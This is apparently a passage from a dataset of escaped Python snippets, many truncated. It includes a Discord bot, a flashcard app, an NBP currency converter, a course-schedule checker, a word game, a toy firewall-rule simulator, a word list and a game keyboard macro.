<= 0:\n        await ctx.respond(\"\uc785\uae08 \uae08\uc561\uc740 0\ubcf4\ub2e4 \ucee4\uc57c \ud569\ub2c8\ub2e4.\")\n        return\n\n    if ctx.author.id not in user_balances:\n        user_balances[ctx.author.id] = 0\n\n    user_balances[ctx.author.id] += amount\n    await ctx.respond(f\"{amount} \ub9cc\ud07c\uc758 \uae08\uc561\uc744 \uc785\uae08\ud558\uc600\uc2b5\ub2c8\ub2e4.\")\nbot.run(TOKEN)\n",
    "import customtkinter as ctk\nfrom tkinter import messagebox, Toplevel, Listbox\nimport os\n\nctk.set_appearance_mode(\"System\")  # \u041f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u0430\u044f \u0442\u0435\u043c\u0430\nctk.set_default_color_theme(\"blue\")  # 'blue' (default), 'green', 'dark-blue'\n\nclass LanguageCardsApp(ctk.CTk):\n    def __init__(self, cards_file=\"cards.txt\"):\n        super().__init__()\n\n        self.title(\"\u041a\u0430\u0440\u0442\u043e\u0447\u043a\u0438 \u0434\u043b\u044f \u0438\u0437\u0443\u0447\u0435\u043d\u0438\u044f \u044f\u0437\u044b\u043a\u0430\")\n        self.geometry(\"500x500\")\n\n        self.cards_file = cards_file\n        self.cards = []\n        self.load_cards()\n\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.term_label = ctk.CTkLabel(self, text=\"\u0422\u0435\u0440\u043c\u0438\u043d:\")\n        self.term_label.pack(pady=10)\n\n        self.term_entry = ctk.CTkEntry(self, width=200, placeholder_text=\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043d\u043e\u0441\u0442\u0440\u0430\u043d\u043d\u043e\u0435 \u0441\u043b\u043e\u0432\u043e\")\n        self.term_entry.pack()\n\n        self.definition_label = ctk.CTkLabel(self, text=\"\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435:\")\n        self.definition_label.pack(pady=10)\n\n        self.definition_entry = ctk.CTkEntry(self, width=200, placeholder_text=\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0438\u043b\u0438 \u043f\u0435\u0440\u0435\u0432\u043e\u0434\")\n        self.definition_entry.pack()\n\n        # \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c \u0442\u043e\u043b\u044c\u043a\u043e \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b width \u0438 height \u0434\u043b\u044f \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043a\u043d\u043e\u043f\u043e\u043a\n        self.add_button = ctk.CTkButton(self, text=\"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a\u0430\u0440\u0442\u043e\u0447\u043a\u0443\", command=self.add_card, fg_color=\"#3073FB\", width=200, height=40)\n        self.add_button.pack(pady=20)\n\n        self.review_button = ctk.CTkButton(self, text=\"\u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u043a\u0430\u0440\u0442\u043e\u0447\u043a\u0438\", command=self.review_cards, fg_color=\"#3073FB\", width=200, height=40)\n        self.review_button.pack(pady=10)\n\n        self.edit_button = ctk.CTkButton(self, text=\"\u0420\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u0430\u0440\u0442\u043e\u0447\u043a\u0438\", command=self.edit_cards, fg_color=\"#2B2B2B\", width=200, height=40)\n        self.edit_button.pack(pady=20)\n        \n        self.theme_button = ctk.CTkButton(self, text=\"\u0421\u043c\u0435\u043d\u0438\u0442\u044c \u0442\u0435\u043c\u0443\", command=self.toggle_theme, fg_color=\"#2B2B2B\", width=200, height=40)\n        self.theme_button.pack(pady=10)\n\n    def toggle_theme(self):\n        if ctk.get_appearance_mode() == \"Dark\":\n            ctk.set_appearance_mode(\"Light\")\n        else:\n            ctk.set_appearance_mode(\"Dark\")\n\n    def add_card(self):\n        term = self.term_entry.get()\n        definition = self.definition_entry.get()\n\n        if term and definition:\n            self.cards.append([term, definition])\n            self.term_entry.delete(0, 'end')\n            self.definition_entry.delete(0, 'end')\n            messagebox.showinfo(\"\u0423\u0441\u043f\u0435\u0445\", \"\u041a\u0430\u0440\u0442\u043e\u0447\u043a\u0430 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e!\")\n            self.save_cards()\n        else:\n            messagebox.showwarning(\"\u0412\u043d\u0438\u043c\u0430\u043d\u0438\u0435\", \"\u0417\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u0435 \u043e\u0431\u0430 \u043f\u043e\u043b\u044f \u0434\u043b\u044f \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043a\u0430\u0440\u0442\u043e\u0447\u043a\u0438.\")\n\n    def load_cards(self):\n        if os.path.exists(self.cards_file):\n            with open(self.cards_file, \"r\", encoding=\"utf-8\") as f:\n                for line in f:\n                    term, definition = line.strip().split(' - ')\n                    self.cards.append([term, definition])\n\n    def save_cards(self):\n        with open(self.cards_file, \"w\", encoding=\"utf-8\") as f:\n            for term, definition in self.cards:\n                f.write(f\"{term} - {definition}\\n\")\n\n    def review_cards(self):\n        if not self.cards:\n            messagebox.showinfo(\"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f\", \"\u041f\u043e\u043a\u0430 \u043d\u0435\u0442 \u043a\u0430\u0440\u0442\u043e\u0447\u0435\u043a \u0434\u043b\u044f \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0430.\")\n            return\n\n        self.is_term_shown = True\n        self.review_window = Toplevel(self)\n        self.review_window.title(\"\u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 \u043a\u0430\u0440\u0442\u043e\u0447\u0435\u043a\")\n        self.card_index = 0\n        self.show_card(self.card_index)\n\n    def show_card(self, index):\n        for widget in self.review_window.winfo_children():\n            widget.destroy()\n\n        card_text = self.cards[index][0] if self.is_term_shown else self.cards[index][1]\n\n        card_label = ctk.CTkLabel(self.review_window, text=card_text, wraplength=400)\n        card_label.pack(pady=20)\n\n        flip_button = ctk.CTkButton(self.review_window, text=\"\u041f\u0435\u0440\u0435\u0432\u0435\u0440\u043d\u0443\u0442\u044c\", command=self.flip_card, fg_color=\"#3073FB\", width=150, height=40)\n        flip_button.pack(pady=10)\n\n        navigation_frame = ctk.CTkFrame(self.review_window)\n        navigation_frame.pack(pady=20)\n\n        prev_button = ctk.CTkButton(navigation_frame, text=\"<< \u041f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0430\u044f\", command=lambda: self.navigate_card(-1), fg_color=\"#3073FB\", width=150, height=40)\n        prev_button.pack(side='left', padx=10)\n\n        next_button = ctk.CTkButton(navigation_frame, text=\"\u0421\u043b\u0435\u0434\u0443\u044e\u0449\u0430\u044f >>\", command=lambda: self.navigate_card(1), fg_color=\"#3073FB\", width=150, height=40)\n        next_button.pack(side='right', padx=10)\n\n    def flip_card(self):\n        self.is_term_shown = not self.is_term_shown\n        self.show_card(self.card_index)\n\n    def navigate_card(self, direction):\n        self.card_index += direction\n        self.card_index = max(0, min(self.card_index, len(self.cards) - 1))\n        self.is_term_shown = True\n        self.show_card(self.card_index)\n\n    def edit_cards(self):\n        edit_window = Toplevel(self)\n        edit_window.title(\"\u0420\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u0430\u0440\u0442\u043e\u0447\u043a\u0438\")\n\n        listbox = Listbox(edit_window)\n        listbox.pack(padx=10, pady=10, fill=\"both\", expand=T",
    "\"\"\"\nCEApp - Cash Exchange Application - ENGINE\n\n2024\n\n\"\"\"\nimport requests\nimport json\n\n\ndef rounder2(func):\n    def wrapper(self, *args, **kwargs):\n        try:\n            result = func(self, *args, **kwargs)\n            return round(result, 2)\n        except TypeError:\n            return f'Data problem!'\n    return wrapper\n\n\ndef rounder3(func):\n    def wrapper(self, *args, **kwargs):\n        try:\n            result = func(self, *args, **kwargs)\n            return round(result, 4)\n        except TypeError:\n            return f'Data problem!'\n    return wrapper\n\n\nclass APIDataCalls:\n    @staticmethod\n    def complex_calls(code):\n        try:\n            if code == 'PLN':\n                return 1\n            else:\n                api_call = requests.get(f'http://api.nbp.pl/api/exchangerates/rates/a/{code}/?format=json')\n                api_load = json.loads(api_call.content)\n                return api_load\n        except requests.exceptions.ConnectionError:\n            return f'Connection Error'\n\n    @staticmethod\n    def code_calls(code):\n        try:\n            if code == 'PLN':\n                return 'PLN'\n            else:\n                api_call = requests.get(f'http://api.nbp.pl/api/exchangerates/rates/a/{code}/?format=json')\n                api_load = json.loads(api_call.content)\n                code_load = api_load['code']\n                return code_load\n        except requests.exceptions.ConnectionError:\n            return f'Connection Error'\n\n    @staticmethod\n    def value_calls(code):\n        try:\n            if code == 'PLN':\n                return 1\n            else:\n                api_call = requests.get(f'http://api.nbp.pl/api/exchangerates/rates/a/{code}/?format=json')\n                api_load = json.loads(api_call.content)\n                api_value_extraction = api_load['rates'][0]['mid']\n                return api_value_extraction\n        except requests.exceptions.ConnectionError:\n            return f'Connection Error'\n\n    @staticmethod\n    def history_calls(code, date):\n        try:\n            if code == 'PLN':\n                return 1\n            else:\n                api_call = requests.get(f'http://api.nbp.pl/api/exchangerates/rates/a/{code}/{date}/?format=json')\n                api_load = json.loads(api_call.content)\n                api_history_extraction = api_load[\"rates\"][0][\"mid\"]\n                return api_history_extraction\n        except requests.exceptions.ConnectionError:\n            return f'Connection Error'\n\n    @staticmethod\n    def gold_calls():\n        try:\n            api_call = requests.get(f'http://api.nbp.pl/api/cenyzlota')\n            api_load = json.loads(api_call.content)\n            gold_prize = api_load[0]['cena']\n            return gold_prize\n        except requests.exceptions.ConnectionError:\n            return f'Connection Error'\n\n\nclass TableConverterValue(APIDataCalls):\n    def __init__(self, entry_currency, output_currency):\n        self.entry_currency = entry_currency\n        self.output_currency = output_currency\n\n    @rounder3\n    def convert_table_value(self):\n        entry_value_request = self.value_calls(self.entry_currency)\n        output_value_request = self.value_calls(self.output_currency)\n\n        if self.entry_currency == self.output_currency:\n            return 1.000\n        else:\n            result = entry_value_request/output_value_request\n            return result\n\n    def __str__(self):\n        try:\n            return f'{self.convert_table_value()}'\n        except json.decoder.JSONDecodeError:\n            return f'No data!'\n\n\nclass TableConverterCodes(APIDataCalls):\n    def __init__(self, output_currency):\n        self.output_currency = output_currency\n\n    def convert_table_code(self):\n        return self.output_currency\n\n    def __str__(self):\n        try:\n            return f'{self.convert_table_code()}'\n        except json.decoder.JSONDecodeError:\n            return f'No data!'\n\n\nclass ExchangeRatesCalculator(APIDataCalls):\n    def __init__(self, amount, currency_input, currency_output):\n        self.amount = amount\n        self.currency_input = currency_input\n        self.currency_output = currency_output\n\n    @rounder2\n    def exchange_calculation(self):\n        entry = self.value_calls(self.currency_input)\n        exit_1 = self.value_calls(self.currency_output)\n        calculation = self.amount * (entry/exit_1)\n        return calculation\n\n    def __str__(self):\n        try:\n            return f'{self.exchange_calculation()} {self.currency_output}'\n        except (ValueError, TypeError):\n            return f'Wrong value/input/output!'\n\n\nclass ExchangeRatesHistory(APIDataCalls):\n    def __init__(self, date, target_currency, result_currency):\n        self.date = date\n        self.target_currency = target_currency\n        self.result_currency = result_currency\n\n    @rounder3\n    def history_searching(self):\n        history_calculation = self.history_calls(self.target_currency, self.date)/self.value_calls(self.result_currency)\n  ",
    "#Check if any two lists overlap by checking if any value falls between another list or if one of the values are equal\ndef isOverlapping(lst1, lst2):\n    if (lst2[0] > lst1[0] and lst2[0] < lst1[-1]) or (lst1[0] > lst2[0] and lst1[0] < lst2[-1]):\n\n        return True\n\n    elif (lst1[0] == lst2[0] or lst1[-1] == lst2[-1]):\n\n        return True\n\n    return False\n\n#Convert time to flaot, i.e., \"12:30-14:00\" --> [12.5,14.0]. This will be used with the overlapping function\ndef TimeToFloat(time):\n    #Convert the string into a list\n    time = time.split(\"-\")\n\n    #Loop through the list and divide the last 2 numbers by 60. Ex: if the time ends in 30, like 12:30, you'll get 12.5\n    for index in range(len(time)):\n        time[index] = float(time[index][:-3]) + float(time[index][-2:]) / 60\n\n    return time\n\n#Check if two courses can be registered together. This utilizes the overlapping and time to float conversion functions\ndef isEligible(firstCourse, secondCourse):\n    #Loop through the timings of each course\n    for firstCourseTiming in range(2, len(firstCourse), 2):\n        for secondCourseTiming in range(2, len(secondCourse), 2):\n            #Get the course time and the course day\n            courseOneTime = TimeToFloat(firstCourse[firstCourseTiming])\n            courseTwoTime = TimeToFloat(secondCourse[secondCourseTiming])\n\n            courseOneDay = firstCourse[firstCourseTiming - 1]\n            courseTwoDay = secondCourse[secondCourseTiming - 1]\n            #If the course days are the same and their timings overlap, return false\n            if courseOneDay == courseTwoDay and isOverlapping(courseOneTime, courseTwoTime):\n                return False\n    return True\n\n#Check if a schedule is eligible by checking if every course in said schedule doesn't overlap with another course\ndef isEligibleSchedule(schedule):\n    for firstCourse in range(len(schedule)):\n        for consequentCourse in schedule[firstCourse+1:]:\n            if isEligible(schedule[firstCourse],consequentCourse) == False:\n                return False\n    return True\n\n#Display the course in a formal way.\n#Ex: ['course1,'monday','12:00-15:00','wednesday','9:00-12:00'] --> course1: monday 12:00-15:00, wednesday 9:00-12:00\ndef displayCourse(course):\n    #loop through the course information\n    for info in range(len(course)):\n        #if it's the first item (course name), add :\n        if info == 0:\n            print(course[info] + \": \", end='')\n        #If not, check if it's the course day (odd numbers) and display it with the timing (the item next).\n        elif info % 2 != 0:\n            print(course[info], course[info + 1], end='')\n        #Don't add a comma to the last item\n            if info != len(course) - 2:\n                print(\",\", end='')\n\n#Display the schedule in a formal way.\n#Loop through the courses and use the displayCourse function\ndef displaySchedule(schedule):\n\n    print(\"Missing days: \" + getMissingDays(schedule))\n    print(\"Total hours of freetime: \" + str(totalFreeTimePerSchedule(schedule)) + \" hours\")\n    print(\"Average starting time: \" + singleFloatToTime(averageStartTimePerSchedule(schedule)))\n    print(\"Average finishing time: \" + singleFloatToTime(averageFinishTimePerSchedule(schedule)))\n    print()\n\n    for course in schedule:\n        displayCourse(course)\n        print()\n\n#Get any missing days in a specific schedule. This is a filter function to determine if any schedule can lack any day\ndef getMissingDays(schedule):\n    allowedDays = {'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'}\n    scheduledDays = set()\n\n    for course in schedule:\n        for day in range(1, len(course), 2):\n            scheduledDays.add(course[day])\n\n    missingDays = list(allowedDays - scheduledDays)\n\n    if len(missingDays) == 0:\n        return 'No missing days'\n\n    elif len(missingDays) == 1:\n        return missingDays[0]\n\n    else:\n        missingDaysDisplay = ','.join(missingDays[:-1]) + ' and ' + missingDays[-1]\n\n    return missingDaysDisplay\n\n\n#Get the course name from the file. Ex: Get the \"Information Structures\" from \"Information Structures(BCS206Lec3)\"\ndef courseName(string):\n    return string[:string.find(\"(\")]\n\n#Convert the course, as a string, to a list.\ndef courseStringToCourseList(course):\n    course = course.split(',')\n\n    return course\n\n#Get the class timings for each day\ndef timePerEachDay(schedule):\n    timePerDay = {}\n\n    for course in schedule:\n        for day in range(1, len(course), 2):\n\n            if course[day] not in timePerDay:\n                timePerDay[course[day]] = []\n\n    for course2 in schedule:\n        for day2 in range(1, len(course2), 2):\n            timePerDay[course2[day2]].append(TimeToFloat(course2[day2 + 1]))\n\n    return timePerDay\n\n#Get the difference between two timings, that is, the time between two classes\ndef timeDifference(timeList):\n    timeList.sort()\n\n    difference = 0\n\n    for time in range(len(timeList) - 1):\n        difference += timeList[time + 1][0] - timeList[time][1]\n\n    retu",
    "import os\nimport random\nfrom typing import Union, List\nfrom . import dictionary as dct\nimport data.words as words\nfrom .exceptions import WordNotFound, InvalidGuess, RepeatGuess\nfrom .gpt import GPTHelper\nfrom .guess import Guess\n\n\nclass Thesaurdle:\n    def __init__(self, difficulty: str = \"hard\", rounds: int = 5) -> None:\n        self.gameover = False\n        self.rounds = rounds\n        self.difficulty = difficulty\n        self.lives = rounds\n        self.guesses = []\n        self.answer = self.retrieve_answer(difficulty=self.difficulty)\n        self.answer.complexity = GPTHelper().call_api_for_complexity(self.answer.word)\n        self.formatted_answer = (\n            self.answer.word.capitalize()\n            + \" \"\n            + f\"({self.answer.part_of_speech.capitalize()}): \"\n            + self.answer.definition\n        )\n        self.initial_hint(self.answer.word)\n\n    def play(self) -> None:\n        \"\"\"For every round, submit a guess. Break the loop if you win, else `lose`.\"\"\"\n        print(self.initial_hint(self.answer.word))\n        while self.lives > 0:\n            if self.gameover:\n                break\n            elif self.lives == 0:\n                break\n            self.guess()\n        # This will always trigger win or lose, so keep the function minimal, like showing the answer.\n        # Essetially the stop condition. Might want to do this differently.\n        self.lose()\n\n    def guess(self, word) -> None:\n        guess = Guess(word)\n        self.current_guess = guess.word\n        if self.current_guess in [g.word for g in self.guesses]:\n            raise RepeatGuess\n\n        self.guesses.append(guess)\n\n        if self.gameover or self.lives == 0:\n            self.lose()\n\n        if guess.word == self.answer.word:\n            self.win()\n        else:\n            self.process_guess(guess)\n            self.lives -= 1\n\n    def win(self) -> None:\n        print(\"\\nCongrats! You win.\\n\")\n        self.gameover = True\n\n    def lose(self) -> None:\n        print(self.answer, \"\\n\")\n        self.gameover = True\n\n    def process_guess(self, guess: Guess) -> None:\n        feedback = [\"\\n\"]\n        self.judge_part_of_speech(guess, feedback)\n        self.judge_len(guess, feedback)\n        self.judge_complexity(guess, feedback)\n        self.judge_definition_similarity(guess, feedback)\n        self.hint(guess, feedback)\n\n    def judge_part_of_speech(self, guess: Guess, feedback: str) -> None:\n        if self.answer.part_of_speech in guess.part_of_speech:\n            self.guess_part_of_speech = f\"{self.answer.part_of_speech}\"\n        else:\n            self.guess_part_of_speech = \"{}\".format(\n                \", \".join([x for x in set(guess.part_of_speech)])\n            )\n\n    def judge_len(self, guess: Guess, feedback: str) -> None:\n        lendiff = guess.length - self.answer.length\n        self.lendiff = abs(lendiff)\n        self.guess_word_len = guess.length\n\n    def judge_complexity(self, guess: Guess, feedback: str) -> None:\n        self.compdiff = abs(int(guess.complexity) - int(self.answer.complexity))\n        self.guess_complexity = f\"{guess.complexity} / 5\"\n\n    def judge_definition_similarity(self, guess: Guess, feedback: str) -> None:\n        sim = GPTHelper().call_api_for_similarity(guess.word, self.answer.word)\n        self.guess_sim_num = sim\n        self.guess_sim = f\"{sim} / 5\"\n\n    def hint(self, guess: Guess, feedback: str) -> None:\n        self.guess_hint = GPTHelper().call_api_for_hints(guess.word, self.answer.word)\n\n    def initial_hint(self, answer: str) -> str:\n        self.init_hint = GPTHelper().call_api_for_initial_hint(answer)\n\n    def retrieve_answer(self, difficulty: str) -> str:\n        # Format this better please\n        return (\n            words.word_list[words.word_list.difficulty == difficulty]\n            .reset_index(drop=True)\n            .loc[\n                random.choice(\n                    range(\n                        len(\n                            words.word_list[\n                                words.word_list.difficulty == difficulty\n                            ].reset_index(drop=True)\n                        )\n                    )\n                )\n            ]\n        )\n",
    "import  random\r\n\r\ndef generate_random_ip():\r\n    \"\"\"Function para makapag generate ng random ip address.\"\"\"\r\n    return f\"192.168.1.{random.randint(0, 20)}\"\r\n\r\ndef check_firewall_rules(ip, rules):\r\n    \"\"\"Function if yung ip is match dun sa firewall rules natin.\"\"\"\r\n    for rule_ip, action in rules.items():\r\n        if ip == rule_ip:\r\n            return action\r\n    return \"allow\"  # Default action if walang mag mamatch\r\n\r\ndef main():\r\n    # Malicious firewall rules (key: IP address, value: action)\r\n    firewall_rules = {\r\n        \"192.168.1.1\": \"block\",\r\n        \"192.168.1.4\": \"block\",\r\n        \"192.168.1.9\": \"block\",\r\n        \"192.168.1.13\": \"block\",\r\n        \"192.168.1.16\": \"block\",\r\n        \"192.168.1.19\": \"block\"\r\n    }\r\n\r\n      # for network test ito!\r\n    for _ in range(20):\r\n     ip_address = generate_random_ip()\r\n     action = check_firewall_rules(ip_address, firewall_rules)\r\n     random_number = random.randint(0, 9999)\r\n     print(f\"IP: {ip_address}, Action: {action}, Random: {random_number}\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "word_list = [\n'abruptly', \n'absurd', \n'abyss', \n'affix', \n'askew', \n'avenue', \n'awkward', \n'axiom', \n'azure', \n'bagpipes', \n'bandwagon', \n'banjo', \n'bayou', \n'beekeeper', \n'bikini', \n'blitz', \n'blizzard', \n'boggle', \n'bookworm', \n'boxcar', \n'boxful', \n'buckaroo', \n'buffalo', \n'buffoon', \n'buxom', \n'buzzard', \n'buzzing', \n'buzzwords', \n'caliph', \n'cobweb', \n'cockiness', \n'croquet', \n'crypt', \n'curacao', \n'cycle', \n'daiquiri', \n'dirndl', \n'disavow', \n'dizzying', \n'duplex', \n'dwarves', \n'embezzle', \n'equip', \n'espionage', \n'euouae', \n'exodus', \n'faking', \n'fishhook', \n'fixable', \n'fjord', \n'flapjack', \n'flopping', \n'fluffiness', \n'flyby', \n'foxglove', \n'frazzled', \n'frizzled', \n'fuchsia', \n'funny', \n'gabby', \n'galaxy', \n'galvanize', \n'gazebo', \n'giaour', \n'gizmo', \n'glowworm', \n'glyph', \n'gnarly', \n'gnostic', \n'gossip', \n'grogginess', \n'haiku', \n'haphazard', \n'hyphen', \n'iatrogenic', \n'icebox', \n'injury', \n'ivory', \n'ivy', \n'jackpot', \n'jaundice', \n'jawbreaker', \n'jaywalk', \n'jazziest', \n'jazzy', \n'jelly', \n'jigsaw', \n'jinx', \n'jiujitsu', \n'jockey', \n'jogging', \n'joking', \n'jovial', \n'joyful', \n'juicy', \n'jukebox', \n'jumbo', \n'kayak', \n'kazoo', \n'keyhole', \n'khaki', \n'kilobyte', \n'kiosk', \n'kitsch', \n'kiwifruit', \n'klutz', \n'knapsack', \n'larynx', \n'lengths', \n'lucky', \n'luxury', \n'lymph', \n'marquis', \n'matrix', \n'megahertz', \n'microwave', \n'mnemonic', \n'mystify', \n'naphtha', \n'nightclub', \n'nowadays', \n'numbskull', \n'nymph', \n'onyx', \n'ovary', \n'oxidize', \n'oxygen', \n'pajama', \n'peekaboo', \n'phlegm', \n'pixel', \n'pizazz', \n'pneumonia', \n'polka', \n'pshaw', \n'psyche', \n'puppy', \n'puzzling', \n'quartz', \n'queue', \n'quips', \n'quixotic', \n'quiz', \n'quizzes', \n'quorum', \n'razzmatazz', \n'rhubarb', \n'rhythm', \n'rickshaw', \n'schnapps', \n'scratch', \n'shiv', \n'snazzy', \n'sphinx', \n'spritz', \n'squawk', \n'staff', \n'strength', \n'strengths', \n'stretch', \n'stronghold', \n'stymied', \n'subway', \n'swivel', \n'syndrome', \n'thriftless', \n'thumbscrew', \n'topaz', \n'transcript', \n'transgress', \n'transplant', \n'triphthong', \n'twelfth', \n'twelfths', \n'unknown', \n'unworthy', \n'unzip', \n'uptown', \n'vaporize', \n'vixen', \n'vodka', \n'voodoo', \n'vortex', \n'voyeurism', \n'walkway', \n'waltz', \n'wave', \n'wavy', \n'waxy', \n'wellspring', \n'wheezy', \n'whiskey', \n'whizzing', \n'whomever', \n'wimpy', \n'witchcraft', \n'wizard', \n'woozy', \n'wristwatch', \n'wyvern', \n'xylophone', \n'yachtsman', \n'yippee', \n'yoked', \n'youthful', \n'yummy', \n'zephyr', \n'zigzag', \n'zigzagging', \n'zilch', \n'zipper', \n'zodiac', \n'zombie', \n]",
    "import keyboard\nimport psutil\nimport time\nimport random\n\ndef circle_strafe():\n    try:\n        keys = ['a', 'd']\n        for _ in range(55):\n            try:\n                random_key = random.choice(keys)\n                duration = random.uniform(0.05, 0.3)\n                keyboard.press(random_key)\n                time.sleep(duration)\n                keyboard.release(random_key)\n            except Exception as e:\n                print(e)\n    except Exception as e:\n        print(e)\n\ndef escape_danger():\n    try:    \n        stem = \"q\"\n        forward = \"w\"\n        jump_pad = \"z\"\n        ctrl = \"ctrl\"\n        space = \"space\"\n        run_duration = 0.3 \n        jump_delay = 1\n        stem_delay = 0.4\n        keyboard.press(forward)\n        time.sleep(run_duration)\n        keyboard.press(stem)\n        time.sleep(stem_delay)\n        keyboard.release(stem)\n        keyboard.press(forward)\n        keyboard.press(jump_pad)\n        time.sleep(jump_delay)\n        keyboard.release(jump_pad)\n        keyboard.press(ctrl)\n        time.sleep(0.1)\n        keyboard.release(ctrl)\n        keyboard.press(forward)\n        keyboard.press(space)\n        keyboard.press(forward)\n        time.sleep(3)\n        keyboard.release(space)\n        keyboard.release(forward)\n    except:\n        return    \n\ndef auto_run():\n    stem = \"q\"\n    forward = \"w\"\n    ctrl = \"ctrl\"\n    space = \"space\"\n    slide_reset = 0.1\n    stem_delay = 0.4\n    loop_reset = 0.30\n    jump_delay = 0.01\n    keyboard.press(forward)\n    keyboard.press(stem)\n    time.sleep(stem_delay)\n    keyboard.release(stem)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n    keyboard.release(forward)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n    keyboard.release(forward)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.pr",
